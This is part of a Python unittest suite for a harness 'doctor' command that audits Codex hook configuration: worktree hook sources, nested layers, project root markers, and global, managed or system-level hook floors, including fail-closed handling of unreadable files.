        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(hooks, root_hooks.resolve())
        self.assertTrue(ok)
        self.assertIn("identical worktree copy is ignored", detail)

    def test_linked_worktree_rejects_worktree_only_hook_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        local_hooks = self.write_hooks(linked, '{"hooks": {}}\n')
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(hooks, (root / ".codex" / "hooks.json").resolve())
        self.assertFalse(ok)
        self.assertIn(str(local_hooks.resolve()), detail)
        self.assertIn("authoritative root source is absent", detail)

    def test_linked_worktree_rejects_divergent_hook_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        root_hooks = self.write_hooks(root, '{"hooks": {"root": []}}\n')
        local_hooks = self.write_hooks(linked, '{"hooks": {"worktree": []}}\n')
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(hooks, root_hooks.resolve())
        self.assertFalse(ok)
        self.assertIn(str(local_hooks.resolve()), detail)
        self.assertIn("ignored worktree copy differs", detail)

    def test_doctor_rejects_valid_looking_worktree_only_hook(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(linked, valid_adapter)
        result, output = self.run_doctor_with_fixture_globals(linked)
        root_hooks = (root / ".codex" / "hooks.json").resolve()
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn(str(root_hooks.resolve()), output)
        self.assertIn("authoritative root source is absent", output)
        self.assertIn("[FAIL] project Codex floor: 0 project floor handler(s)", output)

    def test_doctor_uses_identical_root_checkout_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        root_hooks = self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        result, output = self.run_doctor_with_fixture_globals(linked)
        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex hook source: linked worktree", output)
        self.assertIn(str(root_hooks.resolve()), output)
        self.assertIn("identical worktree copy is ignored", output)
        self.assertIn("[ok] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_audits_nested_codex_layers_from_requested_directory(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        nested.mkdir()
        self.write_hooks(nested, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn("2 active Codex hook layer(s)", output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_audits_nested_inline_hook_layer(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        nested.mkdir()
        inline_config = self.write_inline_floor(nested)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn(str(inline_config.resolve()), output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_allows_nested_config_only_layer(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        config = repo / "nested" / ".codex" / "config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[features]\nhooks = true\n", encoding="utf-8")

        result, output = self.run_doctor_with_fixture_globals(config.parent.parent)

        self.assertEqual(result, 0, output)
        self.assertIn("2 active Codex hook layer(s)", output)
        self.assertIn("[ok] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_requires_canonical_root_hooks_json_adapter(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        nested = repo / "nested"
        nested.mkdir()
        self.write_hooks(nested, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn("1 project floor handler(s)", output)
        self.assertIn("0 canonical root hooks.json handler(s)", output)

    def test_doctor_rejects_inline_only_root_floor(self) -> None:
        repo = self.make_repo()
        self.write_inline_floor(repo)

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("1 project floor handler(s)", output)
        self.assertIn("0 canonical root hooks.json handler(s)", output)

    def test_doctor_rejects_nondefault_user_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        nested = repo / "nested"
        nested.mkdir()

        result, output = self.run_doctor_with_fixture_globals(
            nested, user_config="project_root_markers = []\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_stored_profile_project_root_marker_override(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={
                "custom.config.toml": 'project_root_markers = ["workspace.toml"]\n'
            },
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("custom.config.toml", output)

    def test_doctor_audits_mixed_case_profile_marker_when_loadable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={
                "custom.CONFIG.TOML": 'project_root_markers = ["workspace.toml"]\n'
            },
        )

        exact_alias = Path(self.temp.name) / "codex-home" / "custom.config.toml"
        if exact_alias.is_file():
            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex project root markers", output)
            self.assertIn("custom.CONFIG.TOML", output)
        else:
            self.assertEqual(result, 0, output)

    def test_doctor_rejects_invalid_project_root_marker_shape(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config='project_root_markers = ".git"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("must be an array of strings", output)

    def test_doctor_accepts_explicit_default_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config='project_root_markers = [".git"]\n'
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project root markers", output)

    def test_doctor_ignores_unrelated_nested_config_key_collisions(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        unrelated_config = (
            "[mcp_servers.demo.env]\n"
            'hooks = "literal"\n'
            'project_root_markers = "literal"\n\n'
            "[profiles.custom]\n"
            'project_root_markers = "also literal"\n\n'
            "[profiles.custom.features]\n"
            "hooks = false\n"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=unrelated_config
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] no inspectable global Codex floor", output)
        self.assertIn("[ok] Codex project root markers", output)

    def test_doctor_reports_absent_project_root_marker_override(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project root markers", output)
        self.assertIn("0 explicit inspectable declaration(s)", output)
        self.assertIn("cloud/MDM/session/plugin hooks require /hooks", output)

    def test_doctor_ignores_unsupported_legacy_profile_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=(
                "[profiles.custom]\n" 'project_root_markers = ["workspace.toml"]\n'
            ),
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project root markers", output)
        self.assertIn("0 explicit inspectable declaration(s)", output)

    def test_doctor_rejects_multiple_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config='project_root_markers = [".git", "workspace.toml"]\n',
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)

    def test_doctor_rejects_conflicting_profile_project_root_markers(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config='project_root_markers = [".git"]\n',
            profile_configs={
                "custom.config.toml": 'project_root_markers = ["workspace.toml"]\n'
            },
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("custom.config.toml", output)

    def test_doctor_rejects_invalid_marker_config_toml(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config="project_root_markers = [\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers", output)
        self.assertIn("invalid Codex config", output)

    def test_doctor_rejects_unreadable_marker_config(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        with mock.patch.object(
            harness, "toml_config", side_effect=PermissionError("fixture denied")
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project root markers: fixture denied", output)

    def test_doctor_rejects_user_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("codex-home", output)

    def test_doctor_rejects_snake_case_windows_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        alias_floor = (
            "[[hooks.PreToolUse]]\n"
            'matcher = "^Bash$"\n\n'
            "[[hooks.PreToolUse.hooks]]\n"
            'type = "command"\n'
            'command = "echo noop"\n'
            "command_windows = 'py -3 \"$env:USERPROFILE/.claude/hooks/"
            "dispatch.py\" --event pre --runtime codex'\n"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=alias_floor
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("config.toml:hooks", output)

    def test_doctor_rejects_stored_profile_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={"custom.config.toml": self.inline_floor_config_text()},
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("custom.config.toml", output)

    def test_doctor_audits_mixed_case_profile_floor_when_loadable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={"custom.CONFIG.TOML": self.inline_floor_config_text()},
        )

        exact_alias = Path(self.temp.name) / "codex-home" / "custom.config.toml"
        if exact_alias.is_file():
            self.assertEqual(result, 1)
            self.assertIn("[FAIL] no inspectable global Codex floor", output)
            self.assertIn("custom.CONFIG.TOML", output)
        else:
            self.assertEqual(result, 0, output)

    def test_doctor_ignores_unselectable_profile_filenames(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        unselectable_config = (
            'project_root_markers = ["workspace.toml"]\n'
            + self.inline_floor_config_text()
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={
                ".config.toml": unselectable_config,
                "backup.old.config.toml": unselectable_config,
            },
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] no inspectable global Codex floor", output)
        self.assertIn("[ok] Codex project root markers", output)

    def test_doctor_ignores_unsupported_legacy_profile_inline_hooks(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        profile_floor = self.inline_floor_config_text().replace(
            "[[hooks.", "[[profiles.custom.hooks."
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=profile_floor
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] no inspectable global Codex floor", output)

    def test_doctor_fails_closed_when_profile_enumeration_is_denied(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        with mock.patch.object(
            harness,
            "codex_profile_config_paths",
            side_effect=harness.HarnessError("fixture profile enumeration denied"),
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn(
            "[FAIL] no inspectable global Codex floor: "
            "fixture profile enumeration denied",
            output,
        )
        self.assertIn(
            "[FAIL] Codex project root markers: fixture profile enumeration denied",
            output,
        )

    def test_profile_config_enumeration_propagates_directory_errors(self) -> None:
        codex_home = Path(self.temp.name) / "codex-home-enumeration"
        codex_home.mkdir()

        with mock.patch.object(
            harness.os,
            "scandir",
            side_effect=PermissionError("fixture denied"),
        ):
            with self.assertRaisesRegex(
                harness.HarnessError,
                "cannot enumerate Codex profile configs.*fixture denied",
            ):
                harness.codex_profile_config_paths(codex_home)

    def test_profile_config_enumeration_matches_loadable_filename_aliases(
        self,
    ) -> None:
        codex_home = Path(self.temp.name) / "codex-home-filenames"
        codex_home.mkdir()
        ordinary = codex_home / "ordinary.config.toml"
        mixed_case = codex_home / "mixed.CONFIG.TOML"
        unselectable = codex_home / "backup.old.config.toml"
        for path in (ordinary, mixed_case, unselectable):
            path.write_text("", encoding="utf-8")

        paths = harness.codex_profile_config_paths(codex_home)

        self.assertIn(ordinary, paths)
        self.assertNotIn(unselectable, paths)
        exact_alias = codex_home / "mixed.config.toml"
        try:
            mixed_case_is_loadable = exact_alias.samefile(mixed_case)
        except FileNotFoundError:
            mixed_case_is_loadable = False
        self.assertEqual(mixed_case in paths, mixed_case_is_loadable)

    def test_doctor_rejects_system_hooks_json_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_hooks=valid_adapter
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.json", output)

    def test_doctor_rejects_system_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_config=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("system-config.toml", output)

    def test_doctor_rejects_system_requirements_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("requirements.toml", output)

    def test_doctor_rejects_unreadable_static_global_toml(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        system_config = Path(self.temp.name) / "system-config.toml"

        result, output = self.run_doctor_with_denied_static_source(
            repo,
            system_config,
            system_config=self.inline_floor_config_text(),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("fixture denied", output)

    def test_doctor_rejects_unreadable_static_hooks_json(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        system_hooks = Path(self.temp.name) / "hooks.json"

        result, output = self.run_doctor_with_denied_static_source(
            repo,
            system_hooks,
            system_hooks=valid_adapter,
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("fixture denied", output)

    def test_doctor_rejects_unreadable_canonical_project_hooks(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        project_hooks = self.write_hooks(repo, valid_adapter).resolve()
        original_read = harness.read_optional_bytes

        def fixture_read(path: Path) -> bytes | None:
            if path == project_hooks:
                raise harness.HarnessError(f"cannot read {path}: fixture denied")
            return original_read(path)

        with mock.patch.object(
            harness, "read_optional_bytes", side_effect=fixture_read
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("fixture denied", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_unreadable_ignored_worktree_hooks(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        ignored_hooks = self.write_hooks(linked, valid_adapter).resolve()
        original_read = harness.read_optional_bytes

        def fixture_read(path: Path) -> bytes | None:
            if path == ignored_hooks:
                raise harness.HarnessError(f"cannot read {path}: fixture denied")
            return original_read(path)

        with mock.patch.object(
            harness, "read_optional_bytes", side_effect=fixture_read
        ):
            result, output = self.run_doctor_with_fixture_globals(linked)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("fixture denied", output)

    def test_doctor_rejects_unreadable_project_codex_layer(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        denied_layer = (repo / ".codex").resolve()
        original_stat = Path.stat

        def fixture_stat(path: Path, *args: object, **kwargs: object) -> object:
            if path == denied_layer:
                raise PermissionError("fixture layer denied")
            return original_stat(path, *args, **kwargs)

        with mock.patch.object(Path, "stat", autospec=True, side_effect=fixture_stat):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("cannot inspect Codex layer", output)
        self.assertIn("fixture layer denied", output)

    def test_doctor_rejects_managed_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, managed_config=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("managed-config.toml", output)

    def test_doctor_rejects_nested_worktree_only_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        nested.mkdir()
        local_hooks = self.write_hooks(nested, '{"hooks": {}}\n')

        result, output = self.run_doctor_with_fixture_globals(nested)

        authoritative_hooks = root / "nested" / ".codex" / "hooks.json"
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn(str(authoritative_hooks.resolve()), output)
        self.assertIn(str(local_hooks.resolve()), output)
        self.assertIn("authoritative root source is absent", output)
        self.assertIn("[FAIL] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_audits_mapped_nested_root_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        (nested / ".codex").mkdir(parents=True)
        authoritative_hooks = self.write_hooks(root / "nested", valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn("2 active Codex hook layer(s)", output)
        self.assertIn(str(authoritative_hooks.resolve()), output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_audits_mapped_nested_root_inline_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        config = nested / ".codex" / "config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[features]\nhooks = true\n", encoding="utf-8")
        authoritative_config = self.write_inline_floor(root / "nested")

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn(str(authoritative_config.resolve()), output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_rejects_ignored_worktree_inline_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        local_config = self.write_inline_floor(nested)

        result, output = self.run_doctor_with_fixture_globals(nested)

        authoritative_config = root / "nested" / ".codex" / "config.toml"
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn(str(authoritative_config.resolve()), output)
        self.assertIn(str(local_config.resolve()), output)
        self.assertIn("ignored worktree inline hooks", output)
        self.assertIn("[FAIL] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_floor_status_fails_with_divergent_worktree_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, '{"hooks": {"different": []}}\n')

        result, output = self.run_doctor_with_fixture_globals(linked)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("ignored worktree copy differs", output)
        self.assertIn("[FAIL] project Codex floor: 1 project floor handler(s)", output)

    def test_missing_command_is_reported_not_raised(self) -> None:
        result = harness.run(["definitely-not-a-real-harness-command"])
        self.assertEqual(result.returncode, 127)


if __name__ == "__main__":
    unittest.main()
